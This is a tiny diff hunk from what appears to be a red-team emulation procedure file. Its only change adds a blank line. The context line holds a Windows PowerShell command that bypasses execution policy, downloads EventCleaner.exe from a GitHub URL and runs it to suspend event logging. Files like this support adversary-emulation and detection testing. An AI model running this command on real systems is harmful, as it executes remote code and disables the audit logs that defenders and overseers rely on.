@@ -15,3 +15,4 @@ platforms:
   windows:
     cmd:
       command: powershell.exe -exec bypass -C "(New-Object Net.WebClient).DownloadFile('https://github.com/QAX-A-Team/EventCleaner/blob/master/x64/Release/EventCleaner.exe?raw=true','EventCleaner.exe')";.\EventCleaner.exe suspend
+    
